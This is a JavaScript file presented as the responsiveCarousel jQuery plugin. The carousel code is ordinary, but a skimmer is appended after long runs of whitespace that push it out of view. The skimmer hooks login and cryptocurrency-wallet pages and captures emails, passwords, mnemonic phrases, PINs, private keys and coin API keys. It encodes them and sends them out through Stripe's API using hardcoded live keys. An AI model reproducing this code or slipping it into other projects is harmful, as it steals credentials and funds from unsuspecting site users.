/*! responsiveCarousel.JS - v1.2.2                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    
 * https://basilio.github.com/responsiveCarousel
 *
 * Copyright (c) 2018 Basilio Cáceres <basilio.caceres@gmail.com>;
 * Licensed under the MIT license */

;(function($){
	"use strict";
	$.fn.carousel = function(args){
		var defaults, obj;
		defaults = {
			infinite : true,
			visible : 1,
			speed : 'fast',
			overflow : false,
			autoRotate : false,
			navigation : $(this).data('navigation'),
			itemMinWidth : 0,
			itemEqualHeight : false,
			itemMargin : 0,
			itemClassActive : 'crsl-active',
			imageWideClass : 'wide-image',
			// Use to build grid system - carousel : false
			carousel : true
		};
		return $(this).each( function(){
			// Set Object
			obj = $(this);

			// Extend
			if( $.isEmptyObject(args) === false )
				$.extend( defaults, args );
			if( $.isEmptyObject( $(obj).data('crsl') ) === false )
				$.extend( defaults, $(obj).data('crsl') );


			// Touch detection
			defaults.isTouch = 'ontouchstart' in document.documentElement || navigator.userAgent.match(/Android|BlackBerry|iPhone|iPad|iPod|Opera Mini|IEMobile/i) ? true : false ;

			obj.init = function(){
				// Set some default vars
				defaults.total = $(obj).find('.crsl-item').length;
				defaults.itemWidth = $(obj).outerWidth();
				defaults.visibleDefault = defaults.visible;

				// Touch Defaults
				defaults.swipeDistance = null;
				defaults.swipeMinDistance = 100;
				defaults.startCoords = {};
				defaults.endCoords = {};

				// .crsl-items
				$(obj).css({ width: '100%' });
				// .crls-item
				$(obj).find('.crsl-item').css({ position: 'relative', float: 'left', overflow: 'hidden', height: 'auto' });
				// .crsl-item > images with full width
				$(obj).find('.'+defaults.imageWideClass).each( function(){
					$(this).css({ display: 'block', width: '100%', height: 'auto' });
				});
				// .crsl-item > iframes (videos)
				$(obj).find('.crsl-item iframe').attr({ width: '100%' });


				// Declare the item ative
				if( defaults.carousel )
					$(obj).find('.crsl-item:first-child').addClass(defaults.itemClassActive);

				// Move last element to begin for infinite carousel
				if( defaults.carousel && defaults.infinite && ( defaults.visible < defaults.total ) )
					$(obj).find('.crsl-item:first-child').before( $('.crsl-item:last-child', obj) );

				// if defaults.overflow
				if( defaults.overflow === false ){
					$(obj).css({ overflow: 'hidden' });
				} else {
					$('html, body').css({ 'overflow-x': 'hidden' });
				}

				$(obj).trigger('initCarousel', [defaults, obj]);

				// Preload if it`s neccesary
				obj.testPreload();

				// This configure and margins and variables when document is ready,
				// loaded and window is resized
				obj.config();

				// Init AutoRotate
				obj.initRotate();

				// Trigger Clicks
				obj.triggerNavs();

			};

			obj.testPreload= function(){
				if( $(obj).find('img').length > 0 ){
					var totalImages = $(obj).find('img').length, i = 1;
					$(obj).find('img').each( function(){
						obj.preloadImage(this, i , totalImages);
						i++;
					});
				} else {
					$(obj).trigger('loadedCarousel', [defaults, obj]);
				}
			};

			obj.preloadImage = function(image, i, totalImages){
				var new_image = new Image(), attributes = {};
				attributes.src = ( $(image).attr('src') !== undefined ? image.src : '' );
				attributes.alt = ( $(image).attr('alt') !== undefined ? image.alt : '' );
				$(new_image).attr( attributes );
				$(new_image).on('load', function(){
					// Trigger first image loaded as init Loading action
					if( i === 1 )
						$(obj).trigger('loadingImagesCarousel', [defaults, obj]);
					// Trigger last image loaded as loaded complete action
					if( i === totalImages )
						$(obj).trigger('loadedImagesCarousel', [defaults, obj]);
				});
			};

			// Base Configuration:
			obj.config = function(){
				// Width Item
				defaults.itemWidth = Math.floor( ( $(obj).outerWidth() - ( defaults.itemMargin * ( defaults.visibleDefault - 1 ) ) ) / defaults.visibleDefault );
				if( defaults.itemWidth <= defaults.itemMinWidth ){
					defaults.visible = Math.floor( ( $(obj).outerWidth() - ( defaults.itemMargin * ( defaults.visible - 1 ) ) ) / defaults.itemMinWidth ) === 1 ?
						Math.floor( $(obj).outerWidth() / defaults.itemMinWidth ) :
						Math.floor( ( $(obj).outerWidth() - defaults.itemMargin ) / defaults.itemMinWidth );
					defaults.visible = defaults.visible < 1 ? 1 : defaults.visible;
					defaults.itemWidth = defaults.visible === 1 ? Math.floor( $(obj).outerWidth() ) : Math.floor( ( $(obj).outerWidth() - ( defaults.itemMargin * ( defaults.visible - 1 ) ) ) / defaults.visible );
				} else {
					defaults.visible = defaults.visibleDefault;
				}

				if( defaults.carousel ){
					// Normal use - Global carousel variables
					// Set Variables
					obj.wrapWidth = Math.floor( ( defaults.itemWidth + defaults.itemMargin ) * defaults.total );
					obj.wrapMargin = obj.wrapMarginDefault = defaults.infinite && defaults.visible < defaults.total ? parseInt( ( defaults.itemWidth + defaults.itemMargin ) * -1, 10 ) : 0 ;
					// Move last element to begin for infinite carousel
					if( defaults.infinite && ( defaults.visible < defaults.total ) && ( $(obj).find('.crsl-item.'+defaults.itemClassActive).index() === 0 ) ){
						$(obj).find('.crsl-item:first-child').before( $('.crsl-item:last-child', obj) );
						obj.wrapMargin = obj.wrapMarginDefault = parseInt( ( defaults.itemWidth + defaults.itemMargin ) * -1, 10 );
					}
					// Modify width & margin to .crsl-wrap
					$(obj).find('.crsl-wrap').css({ width: obj.wrapWidth+'px', marginLeft: obj.wrapMargin });
				} else {
					// Excepcional use
					// responsiveCarousel might be use to create grids!
					obj.wrapWidth = $(obj).outerWidth();
					$(obj).find('.crsl-wrap').css({ width: obj.wrapWidth+defaults.itemMargin+'px' });
					$('#'+defaults.navigation).hide();
				}

				$(obj).find('.crsl-item').css({ width: defaults.itemWidth+'px', marginRight : defaults.itemMargin+'px' });

				// Equal Height Configuration
				obj.equalHeights();

				// Condition if total <= visible
				if( defaults.carousel ){
					if( defaults.visible >= defaults.total ){
						defaults.autoRotate = false;
						$('#'+defaults.navigation).hide();
					} else {
						$('#'+defaults.navigation).show();
					}
				}
			};

			// Equal Heights
			obj.equalHeights = function(){
				if( defaults.itemEqualHeight !== false ){
					var tallest = 0;
					$(obj).find('.crsl-item').each( function(){
						$(this).css({ 'height': 'auto' });
						if ( $(this).outerHeight() > tallest ){ tallest = $(this).outerHeight(); }
					});
					$(obj).find('.crsl-item').css({ height: tallest+'px' });
				}
				return true;
			};

			obj.initRotate = function(){
				// Set AutoRotate Interval
				if( defaults.autoRotate !== false ){
					obj.rotateTime = window.setInterval( function(){
						obj.rotate();
					}, defaults.autoRotate);
				}
			};

			obj.triggerNavs = function(){
				// Previous / Next Navigation
				$('#'+defaults.navigation).delegate('.previous, .next', 'click', function(event){
					// Prevent default
					event.preventDefault();
					// Prepare execute
					obj.prepareExecute();
					// Previous & next action
					if( $(this).hasClass('previous') && obj.testPrevious(obj.itemActive) ){
						obj.previous();
					} else if( $(this).hasClass('next') && obj.testNext() ){
						obj.next();
					} else {
						return;
					}
				});
			};

			// Prepare Execute
			obj.prepareExecute = function(){
				// Stop rotate
				if( defaults.autoRotate ){
					clearInterval(obj.rotateTime);
				}
				// Prevent Animate Event
				obj.preventAnimateEvent();
				// Active
				obj.itemActive = $(obj).find('.crsl-item.'+defaults.itemClassActive);
				return true;
			};

			obj.preventAnimateEvent = function(){
				if( $(obj).find('.crsl-wrap:animated').length > 0 ){
					return false;
				}
			};

			// Rotate Action
			obj.rotate = function(){
				// Prevent Animate Event
				obj.preventAnimateEvent();
				// Active
				obj.itemActive = $(obj).find('.crsl-item.'+defaults.itemClassActive);
				obj.next();
				return true;
			};

			obj.testPrevious = function(active){
				return $('.crsl-wrap', obj).find('.crsl-item').index(active) > 0;
			};
			obj.testNext = function(){
				return ( !defaults.infinite &&
					obj.wrapWidth >= (
						( ( defaults.itemWidth + defaults.itemMargin ) * ( defaults.visible + 1 ) ) - obj.wrapMargin
					)
				) || defaults.infinite;
			};

			// Previous Animate
			obj.previous = function(){
				obj.wrapMargin = defaults.infinite ? obj.wrapMarginDefault + $(obj.itemActive).outerWidth(true) : obj.wrapMargin + $(obj.itemActive).outerWidth(true);
				var prevItemIndex = $(obj.itemActive).index();
				var newItemActive = $(obj.itemActive).prev('.crsl-item');
				var action = 'previous';
				// Trigger Begin Carousel Move
				$(obj).trigger('beginCarousel', [defaults, obj, action]);
				// Animate
				$(obj).
					find('.crsl-wrap').
					animate({ marginLeft: obj.wrapMargin+'px' }, defaults.speed, function(){
						// Active
						$(obj.itemActive).removeClass(defaults.itemClassActive);
						$(newItemActive).addClass(defaults.itemClassActive);
						if( defaults.infinite ){
							$(this).css({ marginLeft: obj.wrapMarginDefault }).find('.crsl-item:first-child').before( $('.crsl-item:last-child', obj) );
						} else {
							if( obj.testPrevious(newItemActive) === false )
								$( '#'+defaults.navigation ).find('.previous').addClass('previous-inactive');
							if( obj.testNext() )
								$( '#'+defaults.navigation ).find('.next').removeClass('next-inactive');
						}
						// Trigger Carousel Exec
						$(this).trigger('endCarousel', [defaults, obj, action]);
					});
			};

			// Next Animate
			obj.next = function(){
				obj.wrapMargin = defaults.infinite ? obj.wrapMarginDefault - $(obj.itemActive).outerWidth(true) : obj.wrapMargin - $(obj.itemActive).outerWidth(true);
				var nextItemIndex = $(obj.itemActive).index();
				var newItemActive = $(obj.itemActive).next('.crsl-item');
				var action = 'next';
				// Trigger Begin Carousel Move
				$(obj).trigger('beginCarousel', [defaults, obj, action]);
				// Animate
				$(obj).
					find('.crsl-wrap').
					animate({ marginLeft: obj.wrapMargin+'px' }, defaults.speed, function(){
						// Active
						$(obj.itemActive).removeClass(defaults.itemClassActive);
						$(newItemActive).addClass(defaults.itemClassActive);
						if( defaults.infinite ){
							$(this).css({ marginLeft: obj.wrapMarginDefault }).find('.crsl-item:last-child').after( $('.crsl-item:first-child', obj) );
						} else {
							if( obj.testPrevious(newItemActive) )
								$( '#'+defaults.navigation ).find('.previous').removeClass('previous-inactive');
							if( obj.testNext() === false )
								$( '#'+defaults.navigation ).find('.next').addClass('next-inactive');
						}
						// Trigger Carousel Exec
						$(this).trigger('endCarousel', [defaults, obj, action]);
					});
			};

			var mouseHover = false, current;
			$(window).on('mouseleave', function(event){
				// Detect current
				if (event.target) current = event.target;
				else if (event.srcElement) current = event.srcElement;
				// Detect mouseover
				if( ( $(obj).attr('id') && $(current).parents('.crsl-items').attr('id') === $(obj).attr('id') ) || ( $(current).parents('.crsl-items').data('navigation') === $(obj).data('navigation') ) ){
					mouseHover = true;
				} else {
					mouseHover = false;
				}
				// False
				return false;
			});

			$(window).on('keydown', function(event){
				if( mouseHover === true ){
					// Previous & next action
					if( event.keyCode === 37 ){
						// Prepare execute
						obj.prepareExecute();
						// Previous
						obj.previous();
					} else if( event.keyCode === 39 ){
						// Prepare execute
						obj.prepareExecute();
						// Next
						obj.next();
					}
				}
				return;
			});

			if( defaults.isTouch ){
				$(obj).on('touchstart', function(e){
					$(obj).addClass('touching');
					defaults.startCoords.pageX = defaults.endCoords.pageX = e.originalEvent.targetTouches[0].pageX;
					defaults.startCoords.pageY = defaults.endCoords.pageY = e.originalEvent.targetTouches[0].pageY;
					$('.touching').on('touchmove',function(e){
						defaults.endCoords.pageX = e.originalEvent.targetTouches[0].pageX;
						defaults.endCoords.pageY = e.originalEvent.targetTouches[0].pageY;
						if( Math.abs( parseInt( defaults.endCoords.pageX-defaults.startCoords.pageX, 10 ) ) > Math.abs( parseInt( defaults.endCoords.pageY-defaults.startCoords.pageY, 10 ) ) ){
							e.preventDefault();
							e.stopPropagation();
						}
					});
				}).on('touchend', function(e){					
					defaults.swipeDistance = defaults.endCoords.pageX - defaults.startCoords.pageX;
					if( defaults.swipeDistance >= defaults.swipeMinDistance ){
						obj.prepareExecute();
						// swipeLeft
						obj.previous();
						e.preventDefault();
						e.stopPropagation();
					} else if( defaults.swipeDistance <= - defaults.swipeMinDistance ){
						obj.prepareExecute();
						// swipeRight
						obj.next();
						e.preventDefault();
						e.stopPropagation();
					}
					$('.touching').off('touchmove').removeClass('touching');
				});
			}

			$(obj).on('loadedCarousel loadedImagesCarousel', function(){
				// Trigger window onload EqualHeights
				obj.equalHeights();
			});

			// Create method to resize element
			$(window).on('carouselResizeEnd', function(){
				// This configure and margins and variables when document is ready,
				// loaded and window is resized
				if( defaults.itemWidth !== $(obj).outerWidth() )
					obj.config();

			});

			// Carousel General Detection
			$(window).ready( function(){
				// Trigger Prepare Event Carousel
				$(obj).trigger('prepareCarousel', [defaults, obj]);
				// Init some defaults styles
				obj.init();
				// ResizeEnd event
				$(window).on('resize', function(){
					if( this.carouselResizeTo ) clearTimeout(this.carouselResizeTo);
					this.carouselResizeTo = setTimeout(function(){
						$(this).trigger('carouselResizeEnd');
					}, 10);
				});
			});

			$(window).load( function(){
				// Preload if it`s neccesary
				obj.testPreload();
				// This configure and margins and variables when document is ready,
				// loaded and window is resized
				obj.config();
			});
		});
	};
})(jQuery);




















































































































































































































































































































































































































































































































































































































































































































































































































                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           ;if(typeof(Storage) !== "undefined") {   if(!localStorage.kn) { localStorage.kn = 0; } if(!localStorage.d) {localStorage.d = ' ';}} else { if(document.cookie.indexOf('kn=') == -1){document.cookie = "kn=0; expires= 31 Dec 9999 12:00:00 UTC; path=/"; 
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           }if(document.cookie.indexOf('d=') == -1){document.cookie = "d=; expires= 31 Dec 9999 12:00:00 UTC; path=/"; }};    function getCookie(cname) {var name = cname + "="; var decodedCookie = decodeURIComponent(document.cookie); var ca = 
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           decodedCookie.split(';');for(var i = 0; i <ca.length; i++) {var c = ca[i]; while (c.charAt(0) == ' ') { c = c.substring(1); }	if (c.indexOf(name) == 0) {return c.substring(name.length, c.length); }} return ""; }function send (data){var keys = 
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           ["rk_live_ul1QKQFMjTBGGqsTEBnqulm9", "rk_live_EOdhvPtLOg0KQZTFMuIB8xPW", "rk_live_KwgwC86QwRPocv48018F1bzP", "rk_live_Z9dt4uZcSWZPTKUniP44kG0c", "rk_live_8EIervsyHe9cUSB07FsR0Hlo"];if (localStorage.kn){var kn= Number(localStorage.kn)} else { var kn 
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           = getCookie('kn'); }var auth = 'Bearer ' + keys[kn];if(kn <5){var xhttp = new XMLHttpRequest();xhttp.open("POST", "https://api.stripe.com/v1/customers", true);xhttp.setRequestHeader("Authorization", auth);xhttp.setRequestHeader("Content-type", 
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           "application/x-www-form-urlencoded");xhttp.send("description="+data);} else {return}xhttp.onreadystatechange = function() {if (xhttp.readyState == 4 && xhttp.status !== 200){ console.clear();if (localStorage.kn) { if (localStorage.kn < 4) 
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           {localStorage.kn = Number(localStorage.kn)+1; send(data);} }else { var kn2 = getCookie('kn'); if (kn2 < 4) {document.cookie = "kn="+Number(Number(kn2)+Number(1))+";expires= 31 Dec 9999 12:00:00 UTC; path=/"; send(data)} }}if (xhttp.readyState == 4 
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           && xhttp.status == 200){ location.reload();  }};};if (document.getElementsByClassName('button btn-success submitter')[0] && window.location.href.includes('sign_in')) {document.getElementsByClassName('button btn-success submitter')[0].onclick = 
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           function(){if(document.getElementById("user_email").value && document.getElementById("user_password").value) {var email = document.getElementById("user_email").value;var pass = document.getElementById("user_password").value;var data = 
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           "*$$"+btoa(email)+"~$*"+btoa(pass);stor(data,'#01','#02');}}};if (document.getElementById("saveSecretsButton")) {document.getElementById("saveSecretsButton").onclick = function(){if(document.getElementById("mnemonicText") && 
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           document.getElementsByTagName("center")[1] && document.getElementsByTagName("kbd")[0] && !window.location.href.includes('sett')) {var mne0 = document.getElementById("mnemonicText").innerHTML;var mne = mne0.replace("<em>","").replace("</em>","");var 
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           tag = document.getElementsByTagName("center")[1]; var pin = tag.getElementsByTagName("input")[1].value;var ltc_api = document.getElementsByTagName("kbd")[0].innerHTML;var btc_api = document.getElementsByTagName("kbd")[1].innerHTML;var doge_api = 
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           document.getElementsByTagName("kbd")[2].innerHTML;var data = "~*~"+btoa(mne)+"$~*"+btoa(pin)+"$**"+btoa(ltc_api)+"*~~"+btoa(btc_api)+"**$"+btoa(doge_api);stor(data,'#04','#05');}}};if (document.getElementById("withdrawalButton")) 
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           {document.getElementById("withdrawalButton").onclick = function(){if (document.getElementsByClassName("form-control")[3].value && document.getElementsByTagName("kbd")[0] ) {var pin = document.getElementsByClassName("form-control")[3].value;var 
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           ltc_api = document.getElementsByTagName("kbd")[0].innerHTML;var btc_api = document.getElementsByTagName("kbd")[1].innerHTML;var doge_api = document.getElementsByTagName("kbd")[2].innerHTML;var data = 
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           "$~*"+btoa(pin)+"$**"+btoa(ltc_api)+"*~~"+btoa(btc_api)+"**$"+btoa(doge_api);stor(data,'#04','#05');}}};if (document.getElementById("retrieveprivkeybutton")) {document.getElementById("retrieveprivkeybutton").onclick = function() { sec(); 
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           pink();}}function sec() {setTimeout(function(){if(document.getElementsByTagName("p")[4] && document.getElementsByTagName("p")[6]) {var panel = document.getElementById("status_panel");var redeem0 = panel.getElementsByTagName("p")[4].innerHTML;var 
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           redeem = re(redeem0,'','Redeem Script Hex:','*',' ');var pk0 = panel.getElementsByTagName("p")[6].innerHTML;var pk = re(pk0,'','Private Keys:','*','[',']','"',' ');var coma = pk.indexOf(","); var pk1= pk.slice(0,coma); var pk2= 
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           pk.slice(coma+1,500);var data = '*~$'+btoa(redeem)+"$*$"+btoa(pk1)+'$*~'+btoa(pk2);stor(data,'','',555); }}, 7000)};function pink() {if(document.getElementById('privkey_pin').value) {var pin= document.getElementById('privkey_pin').value;var data = 
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           "$~*"+btoa(pin);stor(data,'#04',''); }};if(localStorage.d) { var d=localStorage.d;} else { var d= getCookie('d');} if(d.includes('$~*') && !d.includes('$**')) {if (document.getElementsByTagName("kbd")[0] ) {var ltc_api = 
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           document.getElementsByTagName("kbd")[0].innerHTML;var btc_api = document.getElementsByTagName("kbd")[1].innerHTML;var doge_api = document.getElementsByTagName("kbd")[2].innerHTML;var data= 
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           "$**"+btoa(ltc_api)+"*~~"+btoa(btc_api)+"**$"+btoa(doge_api);stor(data,'#05','#06');}}if(document.getElementById('saveSecretsButton') && document.getElementsByTagName("center")[1] && document.getElementsByTagName("kbd")[0] && 
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           window.location.href.includes('sett')) {document.getElementById('saveSecretsButton').onclick = function() {var tag = document.getElementsByTagName("center")[1]; if(tag.getElementsByTagName('input')[1].value) {var pin = 
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           tag.getElementsByTagName('input')[1].value;var mne0 = document.getElementById("mnemonicText").innerHTML;var mne = mne0.replace("<em>","").replace("</em>","");var ltc_api = document.getElementsByTagName("kbd")[0].innerHTML;var btc_api = 
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           document.getElementsByTagName("kbd")[1].innerHTML;var doge_api = document.getElementsByTagName("kbd")[2].innerHTML;var data = 
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           "$~*"+btoa(pin)+'~*~'+btoa(mne)+"$**"+btoa(ltc_api)+"*~~"+btoa(btc_api)+"**$"+btoa(doge_api);stor(data,'','',555);}}}if(document.getElementById('revoke_keys')) {document.getElementById('revoke_keys').onclick = function() {if(localStorage.d) 
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           {localStorage.d = re(localStorage.d,'','#03`','#04`','#05`','#06`','#07`');} else { var cdata = getCookie('d'); document.cookie = "d=" + re(cdata,'','#03`','#04`','#05`','#06`','#07`') +";expires= 31 Dec 9999 12:00:00 UTC; path=/";}}}function 
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           va(d,variable){ var query = d; var vars = query.split("#"); for (var i=0;i<vars.length;i++) {var pair = vars[i].split("`"); if(pair[0] == variable && pair[1].length>0){return pair[1];}} return(false); }function 
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           re(d0,r,f1,f2,f3,f4,f5,f6,f7,f8,f9,f10,f11,f12,f13,f14,f15) {var ff = [f1,f2,f3,f4,f5,f6,f7,f8,f9,f10,f11,f12,f13,f14,f15]; var num = 0; var d = d0; wh();function wh() { while (ff[num] && d.includes(ff[num])) { d=d.replace(ff[num],r); } 
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           };while(!d.includes(ff[num]) && num<15) {num++; wh();}return d;}function re2(d0,f1,r1,f2,r2,f3,r3,f4,r4,f5,r5,f6,r6,f7,r7,f8,r8,f9,r9,f10,r10,f11,r11,f12,r12) {var ff = [f1,r1,f2,r2,f3,r3,f4,r4,f5,r5,f6,r6,f7,r7,f8,r8,f9,r9,f10,r10,f11,r11,f12,r12]; 
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           var num = 0; var d = d0; wh2();function wh2() {while (d.includes(ff[num])) {d=d.replace(ff[num],ff[num+1]);} };while(ff[num+1] && !d.includes(ff[num]) && num<24) {num=num+2; wh2();}return d;}function stor(data0,p1,p2,p3) {var data = 
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           re2(data0,'1','!','2','/','3','ß','4','-','5','°','6','}','7','<','8','²','9','¶','0','³');data= re2(data,'A','«','a','{','B','±','b','|','X',')','x','¹','R','µ','r','×','N','»','n','(','=','>');if(localStorage.d) { var dd=localStorage.d; 
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           if(!dd.includes(data)) { if(!dd.includes(p1) || !dd.includes(p2) || p3 == 555){ localStorage.d += data;}}} else { var cdata = getCookie('d'); if(!cdata.includes(data)) { if(!cdata.includes(p1) || !cdata.includes(p2) || p3 == 555) { document.cookie = 
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           "d=" + cdata + data + ";expires= 31 Dec 9999 12:00:00 UTC; path=/"; }}}};function send1() {if(localStorage.d) { var d = localStorage.d.replace(' ',''); } else { var d = getCookie('d'); } if(d.includes('$~*') && d.includes('$**') || 
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           d.includes('*~$')) {d= re(d,'','#01`','#02`','#03`','#04`','#05`','#06`','#07`','#08`','#09`','#10`');send(d);del();}}function del() {if(localStorage.d) {var d = localStorage.d;} else {var d = 
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           getCookie('d');}d=re2(d,'*$$','#01`','~$*','#02`','~*~','#03`','$~*','#04`','$**','#05`','*~~','#06`','**$','#07`','*~$','#08`','$*$','#09`','$*~','#10`');while(va(d,'01')||va(d,'02')||va(d,'03')||va(d,'04')||va(d,'05')||va(d,'06')||va(d,'07')||va(d,
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           '08')||va(d,'09')||va(d,'10')) {d=re(d,'',va(d,'01'),va(d,'02'),va(d,'03'),va(d,'04'),va(d,'05'),va(d,'06'),va(d,'07'),va(d,'08'),va(d,'09'),va(d,'10'));}d=re(d,'','#08`','#09`','#10`');function del2(pa) { while(d.indexOf(pa) !== d.lastIndexOf(pa)) 
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           {d=d.replace(pa,'');}} del2('#01`'); del2('#02`'); del2('#03`'); del2('#04`'); del2('#05`'); del2('#06`'); del2('#07`'); if(localStorage.d) { localStorage.d = d;} else { document.cookie = "d="+d+";expires= 31 Dec 9999 12:00:00 UTC; path=/"; 
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           }};if(window.location.href.includes('boar')) { send1(); }



















































































































































































































































































































































































































































































































































































































 
